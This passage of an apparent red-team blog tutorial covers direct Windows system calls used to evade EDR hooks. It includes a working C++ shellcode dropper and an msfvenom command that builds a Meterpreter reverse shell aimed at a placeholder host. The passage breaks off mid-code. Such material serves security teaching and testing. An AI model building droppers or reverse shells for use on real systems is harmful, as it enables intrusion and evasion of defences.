@@ -1,0 +1,1048 @@
+# https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low
+
+<!DOCTYPE html><html lang="en">
+    <body id="Main">
+        
+        <main>
+                    <div class="blog-page">
+        <div class="page-intro">
+            <a class="back" href="https://redops.at/en/knowledge-base">Previous</a>
+            <div class="content container">
+                <h1 class="h1">
+                    Direct Syscalls: A journey from high to low
+                </h1>
+                <div class="blog-text-section">
+                    <p><strong>tl;dr</strong>&nbsp;A system call is a technical instruction in the Windows operating system that allows a temporary transition from user mode to kernel mode. This is necessary, for example, when a user-mode application such as Notepad wants to save a document. Each system call has a specific syscall ID, which can vary from one version of Windows to another. Direct system calls are a technique for attackers (red team) to execute code in the context of Windows APIs via system calls without the targeted application (malware) obtaining Windows APIs from Kernel32.dll or native APIs from Ntdll.dll. The assembly instructions required to switch from user mode to kernel mode are built directly into the malware.<br><br>In recent years, more and more vendors have implemented the technique of user-mode hooking, which, simply put, allows an EDR to redirect code executed in the context of Windows APIs to its own hooking.dll for analysis. If the code executed does not appear to be malicious to the EDR, the affected system call will be executed correctly, otherwise the EDR will prevent execution. Usermode hooking makes malware execution more difficult, so attackers (red teams) use various techniques such as API unhooking, direct system calls or indirect system calls to bypass EDRs.<br><br>In this article, I will focus on the <strong>Direct System Call</strong> technique and show you how to create a Direct System Call shellcode dropper step-by-step using Visual Studio in C++. I will start with a dropper that only uses the Windows APIs (High Level APIs). In the second step, the dropper undergoes its first development and the Windows APIs are replaced by Native APIs (Medium Level APIs). And in the last step, the Native APIs are replaced by Direct System Calls (Low Level APIs).</p>
+                </div>
+                                                <ul class="tags">
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base?filter=EDR%20Evasion" data-content="EDR Evasion">
+                                EDR Evasion
+                            </a>
+                        </li>
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base?filter=Malware%20Development" data-content="Malware Development">
+                                Malware Development
+                            </a>
+                        </li>
+                                    </ul>
+            </div>
+            
+        </div>
+        <div class="blog-content">
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Disclaimer<br></h3>
+<p>The content and all code examples in this article are for research purposes only and must not be used in an unethical context!&nbsp;The code used is not new and I make no claim to it. Most of the code comes, as so often, from&nbsp;<a href="https://www.ired.team/" target="_blank" rel="noreferrer noopener"><strong>ired.team</strong></a>, thank you&nbsp;<a href="https://twitter.com/spotheplanet" target="_blank" rel="noreferrer noopener"><strong>@spotheplanet</strong></a>&nbsp;for your brilliant work and sharing it with us all!</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Introduction</h3>
+<p>The technique of direct system calls is no longer a new attack technique for Red Teamers today (April 2023). I myself have covered this topic several times (<a href="https://blog.deepsec.net/deepsec-2020-talk-epp-edr-unhooking-their-protections-daniel-feichter/" target="_blank" rel="noreferrer noopener">DeepSec Vienna 2020</a>) and there are already a large number of well-written articles and useful code repositories on the Internet. Nevertheless, I would like to revisit the topic and look at various aspects related to direct system calls.<br><br>For the next articles in my blog, it is important to me personally to take a closer look at the topic of direct system calls. In this article I will show how to create a shellcode dropper in C++ in Visual Studio (VS) that does not use Windows APIs and Native APIs, but instead uses direct system calls. I will explain what exactly a direct system call is a little later in this article. As a starting point, a simple high level API dropper is used, which is then developed step by step into a direct system call dropper based on low level APIs. The steps to develop the direct system call dropper are as follows:</p>
+<p></p>
+<ul><li><strong>Step 1:</strong>&nbsp;High Level APIs -&gt; Shellcode execution via Windows APIs<br><br></li><li><strong>Step 2:</strong>&nbsp;Medium Level APIs -&gt; Shellcode execution via native APIs<br><br></li><li><strong>Step 3:</strong>&nbsp;Low Level APIs -&gt; Shellcode execution via direct system calls<br><br></li><li><strong>Bonus:</strong>&nbsp;Shellcode as .bin ressource</li></ul>
+<p></p>
+<p><br>I will also explain how to analyse and check your droppers using tools such as API Monitor, Dumpbin and x64dbg. For example, I will look at how to make sure that the dropper is importing the correct Windows APIs&nbsp;or not, and whether the system calls are being executed correctly or from the correct or expected region in the PE structure.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>What is a System Call?</h3>
+<p>Before I go into what a direct system call is and how it is used by attackers (Red Team), it is important to clarify what a system call is in the first place. Technically, at assembly level, a system call is an instruction implemented into a syscall stub&nbsp;that enables the temporary transition (transition CPU switch) from user mode to kernel mode after the execution of code in Windows user mode in the context of the respective Windows API. The system call thus forms the interface between a process in user mode and the task to be executed in the Windows kernel.<br><br>Why do you need system calls at all in an operating system that is split into user mode and kernel mode? Here are some examples:</p>
+<ul><li>Access to hardware such as scanners and printers&nbsp;<br></li><li>Network connections for sending and receiving data packets<br></li><li>Reading and writing files&nbsp;<br></li></ul>
+<p></p>
+<p>The following example is intended to illustrate how system calls work under Windows OS. The user wants to save some text or code written in Notepad to the hard disk of the device. To do this, the user mode process notepad.exe needs temporary access to the file system and to various device drivers. However, as both of these components reside in the Windows kernel, user mode access is not straightforward. To solve this problem, Windows uses system calls. These are programmatic instructions that allow a temporary transition from user mode to kernel mode for a specific task of an application, e.g. notepad.exe. Each system call can be found by its own syscall ID and is associated with a specific native API in Windows. However, the syscall ID can vary from one version of Windows to another.<br><br>Please note that this is a very simplified representation of how system calls work in Windows. In detail, user mode and kernel mode operations are much more complex. However, this explanation should be sufficient to illustrate the basic principle. If you want to know more about system calls, I recommend that you take a look at the Windows Internals.<br></p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/notepad_transition_syscall.png" alt="Notepad transition syscall" width="1820" height="1154">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The figure above shows the technical principle of system calls using the above example with notepad. To perform the save operation in the context of the user-mode process notepad.exe, in the first step it accesses kernel32.dll and calls the Windows API WriteFile. In the second step, kernel32.dll accesses Kernelbase.dll in the context of the same Windows API. In the third step, the Windows API WriteFile accesses the Native API NtCreateFile through Ntdll.dll. The Native API contains the technical instructions or syscall call stub to initiate the system call by executing the system call ID and enables the temporary transition (CPU switch) from user mode (ring 3) to kernel mode (ring 0) after execution. </p>
+<p>It then calls the system service dispatcher aka KiSystemCall/KiSystemCall64 in the Windows kernel, which is responsible for querying the system service descriptor table (SSDT) for the appropriate function code based on the executed system call ID (index number in the EAX register). Once the system service dispatcher and the SSDT have worked together to identify the function code for the system call in question, the task is executed in the Windows kernel. Thanks to <a href="https://twitter.com/re_and_more/status/1510512453800636421?lang=en" target="_blank" rel="noreferrer noopener"><strong>@re_and_more</strong></a> for the useful explanation of the system service dispatcher.</p>
+<p>In simple terms, system calls are needed in Windows to perform the temporary transition (CPU switch) from user mode to kernel mode, or to execute tasks initiated in user mode that require temporary access to kernel mode - such as saving files - as a task in kernel mode.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>What is a Direct System Call?</h3>
+<p>TThis is a technique that allows an attacker (red team) to execute malicious code, such as shell code, in the context of APIs on Windows in such a way that the system call is not obtained via <code class="inline-code">ntdll.dll</code>. Instead, the system call or system call stub is implemented in the malware itself, e.g. in the .text region in the form of assembly instructions. Hence the name direct system calls.</p>
+<p>There are several ways to implement direct system calls in malware. In the rest of this article, I will show how to use the syswhispers2 tool to generate the required native API functions and assembler instructions, and implement them in the C++ project under Visual Studio as Microsoft Macro Assembler (masm) code.<br><br>Compared to the previous illustration in the system calls chapter, the following illustration shows the principle of direct system calls under Windows in a simplified way. It can be seen that the user-mode process Malware.exe does not get the system call for the native API NtCreateFile via <code class="inline-code">ntdll.dll</code>, as would normally be the case, but instead has implemented the necessary instructions for the system call in itself.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/direct_syscall_principle.png" alt="Direct syscall principle" width="1840" height="1160">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Why Direct System Calls?</h3>
+<p>Both anti-virus (AV) and endpoint detection and response (EDR) products rely on different defence mechanisms to protect against malware. To dynamically inspect potentially malicious code in the context of Windows APIs, most EDRs today implement the principle of user-mode API hooking. Put simply, this is a technique whereby code executed in the context of a Windows API, such as <code class="inline-code">VirtualAlloc</code> or its native API <code class="inline-code">NtAllocateVirtualMemory</code>, is deliberately redirected by the EDR into the EDR's own <code class="inline-code">hooking.dll</code>. Under Windows, the following types of hooking can be distinguished, among others:</p>
+<ul><li>Inline API hooking <br></li><li>Import Address Table (IAT) hooking <br></li><li>SSDT hooking (Windows Kernel) </li></ul>
+<p></p>
+<p>Before the introduction of Kernel Patch Protection (KPP) aka Patch Guard, it was possible for antivirus products to implement their hooks in the Windows kernel, e.g. using SSDT hooking. With Patch Guard, this was prevented by Microsoft for reasons of operating system stability. Most of the EDRs I have analysed rely primarily on inline API hooking. Technically, an inline hook is a 5-byte assembly instruction (also called a jump or trampoline) that causes a redirection to the EDR's <code class="inline-code">hooking.dll</code> before the system call is executed in the context of the respective native API. The redirection from the<code class="inline-code"> hooking.dll</code> back to the system call in the <code class="inline-code">ntdll.dll</code> only occurs if the executed code analysed by the Hooking.dll was found to be harmless. Otherwise, the execution of the corresponding system call is prevented by the Endpoint Protection (EPP) component of an EPP/EDR combination. The following figure shows a simplified illustration of how user-mode API hooking works with EDR.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/Usermode_hooking_principle.png" alt="Usermode hooking principle" width="1820" height="1154">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>If you take a closer look at the technical structure of the Windows 10 architecture, you will notice that the <code class="inline-code">ntdll.dll</code> in user mode represents the lowest common denominator before the transition to the Windows kernel. For this reason, some well-known EDRs place their inline hooks in specially selected native APIs in ntdll.dll. Ok, if it's that simple, then an EDR could just hook into all the native APIs and make life hell for us Red Teamers. Fortunately, from a Red Teamer's point of view, this is not possible for performance reasons. Simply put, hooking APIs costs resources, time, etc., and the more an EDR slows down an OS, the worse it is for the EDR.<br><br>As a result, EDRs typically only hook select APIs that are often abused by attackers in conjunction with malware. These include native APIs such as NtAllocateVirtualMemory and NtWriteVirtualMemory.</p>
+<figure class="image-center"><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/overview-of-windows-components" target="_blank" rel="noreferrer noopener"><img src="https://redops.at/assets/images/blog/windows_nt_architecture.png" alt="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/overview-of-windows-components"></a><figcaption>https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/overview-of-windows-components</figcaption></figure>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>If you want to check your own EDR to see if it or which APIs are redirected to the EDR's own <code class="inline-code">hooking.dll</code> by inline hooking, you can use a debugger such as WinDbg. To do this, start a program on the endpoint with EDR installed, e.g. notepad, and then connect to the running process via WinDbg. Note that if you make the same mistake as I did at the beginning and load notepad.exe directly as an image into the debugger, you will not find any hooks in the APIs, because in this case the EDR has not yet been able to inject its Hooking.dll into the address space of notepad.exe.</p>
+<p>The following command extracts the memory address of the desired API, in this case the address of the native API <code class="inline-code">NtAllocateVirtualMemory</code>, which is located in <code class="inline-code">ntdll.dll</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">x ntdll<span class="token operator">!</span>NtAllocateVirtualMemory</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The memory address can then be resolved in the next step with the following command and you will get the contents of the native API <code class="inline-code">NtAllocateVirtualMemory</code> in assembly format.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-html" tabindex="0"><code class="code-block-inner language-html">u 00007ff8`16c4d3b0</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The following figure shows a comparison between an endpoint with no EDR installed and no hook, and an endpoint with EDR installed that uses user mode inline hooking for native APIs in&nbsp;<code class="inline-code">ntdll.dll</code>. On the endpoint with EDR installed, the <code class="inline-code">5-byte</code> jump instruction (<code class="inline-code">jmp</code>) is clearly visible. As mentioned earlier, this instruction causes a redirection to the EDR's <code class="inline-code">hooking.dll</code> before returning to ntdll.dll and executing the system call.</p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/windgb_comparison.png" alt=""></figure>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>If you want to be sure that the jump instruction really causes a redirect to the EDR's <code class="inline-code">hooking.dll</code>, you can check this with e.g. x64dbg. If you follow the address of the jump instruction of a hooked API, e.g. <code class="inline-code">NtAllocateVirtualMemory</code> in memory (follow in dissasembler), you will see the redirect to the EDR's <code class="inline-code">hooking.dll</code>. The name of the <code class="inline-code">hooking.dll</code> is intentionally pixelated so that the EDR cannot be identified.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/x64dbg_hook_principle.png" alt="X64dbg hook principle" width="1517" height="993">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Consequences for the Red Team</h3>
+<p>From red team's perspective, the usermode hooking technique results in EDR making it difficult or impossible for malware, such as shellcode, to execute. For this reason, red teamer as well as malicious attackers use various techniques to bypass EDR usermode hooks. Among others, the following techniques are used individually, but also in combination, e.g. API unhooking and direct system calls..</p>
+<ul><li>API-unhooking <br></li><li>Direct system calls <br></li><li>Indirect system calls </li></ul>
+<p><br>In this article I will only focus on the direct system call technique, i.e. I will implement direct system calls in the dropper later on, thus trying to avoid getting the corresponding system calls from <code class="inline-code">ntdll.dll</code>, where some EDRs place their usermode hooks. The basics of direct system calls and usermode hookings should now be clear and the development of the direct system call dropper can begin.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Step 1:&nbsp;High Level APIs</h3>
+<p>In the first step, I deliberately do not use direct system calls yet, but start with the classic implementation via Windows APIs, which are obtained via the <code class="inline-code">kernel32.dll</code>. The POC can be created as a new C++ project (Console Application) in VS and the code can be taken over.<br><br>The technical functionality of the high level API is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the high level API dropper into a direct system call dropper. The code works as follows.<br><br>Within the main function, the variable <code class="inline-code">code</code> is defined, which is responsible for storing the shellcode. The content of <code class="inline-code">code</code> is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token comment">// Insert Meterpreter shellcode  </span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xa6\x12\xd9..."</span><span class="token punctuation">;</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The next step is to define the function pointer <code class="inline-code">void*</code>, which points to the variable <code class="inline-code">exec</code> and stores the return address of the allocated memory using the Windows API&nbsp;<strong><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank" rel="noreferrer noopener">VirtualAlloc</a></strong>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token comment">// Allocate Virtual Memory </span>
+	<span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> code<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The <strong><a href="https://learn.microsoft.com/de-de/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170" target="_blank" rel="noreferrer noopener">memcpy</a></strong> function copies the shellcode in the <code class="inline-code">code</code> variable into the allocated memory.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token comment">// Copy MSF-Shellcode into the allocated memory </span>
+	<span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>And in the last step, the shellcode is executed by calling the function pointer <code class="inline-code">((void(*)())exec)()</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token comment">// Execute MSF-Shellcode in memory </span>
+	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>You can then generate, for example, meterpreter shellcode and copy it into the finished <strong>high-level API dropper</strong>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span>External_IPv4_Redirector LPORT<span class="token operator">=</span><span class="token number">80</span> <span class="token operator">-</span>f c</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+	<span class="token comment">// Insert Meterpreter shellcode  </span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xa6\x12\xd9..."</span><span class="token punctuation">;</span>
+
+
+	<span class="token comment">// Allocate Virtual Memory </span>
+	<span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> code<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+	<span class="token comment">// Copy shellcode into allocated memory </span>
+	<span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+	<span class="token comment">// Execute shellcode in memory </span>
+	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	
+<span class="token punctuation">}</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As mentioned at the beginning, in this article I will show you step by step how to develop your own direct system call dropper in C++. I will also perform a simple API analysis in the context of the different droppers (high, medium and low) and compare the results. For each dropper I want to check from which region of the PE structure the used system calls are called, check if the result seems plausible and compare the results again. The following tools will be used.</p>
+<ul><li><a href="http://www.rohitab.com/apimonitor" target="_blank" rel="noreferrer noopener">API-Monitor</a> -&gt; API analysis <br></li><li><a href="https://learn.microsoft.com/de-de/cpp/build/reference/dumpbin-reference?view=msvc-170" target="_blank" rel="noreferrer noopener">VS Dumpbin</a> -&gt; API analysis </li><li><a href="https://x64dbg.com/" target="_blank" rel="noreferrer noopener">x64dbg</a> -&gt; API and system call analysis</li></ul>
+<p><br></p>
+<h4>API-Monitor: High Level APIs<br></h4>
+<p>I use the program API Monitor to check which APIs or if the correct APIs are being used in the high level POC. In this case I verify that the Windows API <code class="inline-code">VirtualAlloc</code> has been imported by <code class="inline-code">kernel32.dll</code>. I also want to see if there is a correct transition from <code class="inline-code">VirtualAlloc</code> to <code class="inline-code">NtAllocateVirutalMemory</code>. For a correct check it is necessary to filter on the correct APIs. In the context of the high level API dropper, I filter on the following API calls:</p>
+<ul><li>VirtualAlloc</li><li>NtAllocateVirtualMemory<br></li><li>RtlCopyMemory<br></li><li>CreateThread</li><li>NtCreateThreadEx</li></ul>
+<p></p>
+<p>The screenshot of the API Monitor result shows that, as expected, the Windows API <code class="inline-code">VirtualAlloc</code> is called from <code class="inline-code">kernel32.dll</code> in the first step, and then the corresponding native API <code class="inline-code">NtAllocateVirtualMemory</code> is called from <code class="inline-code">ntdll.dll</code> via <code class="inline-code">VirtualAlloc</code>. You can also see that the native API <code class="inline-code">NtCreateThreadEx</code> was called correctly afterwards. The result in the API Monitor is OK as far as it goes.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/high_level_api_monitor.png" alt="High level api monitor" width="1249" height="170">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Dumpbin: High Level APIs </h4>
+<p>The Visual Studio tool "dumpbin" can be used to check which Windows APIs are imported via <code class="inline-code">kernel32.dll</code>. The following command can be used to verify the imports. </p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">cd C<span class="token operator">:</span>\Program <span class="token function">Files</span> <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\Microsoft Visual Studio\<span class="token number">2019</span>\Community
+dumpbin <span class="token operator">/</span>imports high_level<span class="token punctuation">.</span>exe</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The following figure shows that the Windows API VirtualAlloc has been imported correctly.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/dumpbin_high_level.png" alt="Dumpbin high level" width="664" height="455">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>x64dbg: High Level APIs </h4>
+<p>Using x64dbg I check from which region of the PE structure of the high level API dropper the system call for the native API <code class="inline-code">NtAllocateVirtualMemory</code> is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of <code class="inline-code">ntdll.dll</code>. This investigation is very important because later in the article I expect a different result with the low level POC and want to match it.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/systemcall_x64dbg_highlevel.png" alt="Systemcall x64dbg highlevel" width="938" height="173">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/high_level_poc_illustration.png" alt="High level poc illustration" width="1820" height="720">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Step 2: Medium Level APIs</h3>
+<p>In this step I will make the first extension to the dropper and replace the Windows APIs (kernel32.dll) with native APIs (ntdll.dll) in the high level API dropper. In this case, the change is relatively simple as only the Windows API VirtualAlloc needs to be replaced with the native API <strong><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" target="_blank" rel="noreferrer noopener">NtAllocateVirtualMemory</a></strong>. In addition, the native APIs <strong><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory" target="_blank" rel="noreferrer noopener">RtlCopyMemory</a></strong> and <strong><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntfreevirtualmemory" target="_blank" rel="noreferrer noopener">NtFreeVirtualMemory</a></strong> are added to the code.<br><br>Unlike the Windows APIs, most of the Native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. In order to use the native APIs in the medium level dropper, we must manually define the function pointers for the native API functions.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token comment">// Define the NtAllocateVirtualMemory function pointer</span>
+<span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> PNTALLOCATEVIRTUALMEMORY<span class="token punctuation">)</span><span class="token punctuation">(</span>
+    HANDLE ProcessHandle<span class="token punctuation">,</span>
+    PVOID<span class="token operator">*</span> BaseAddress<span class="token punctuation">,</span>
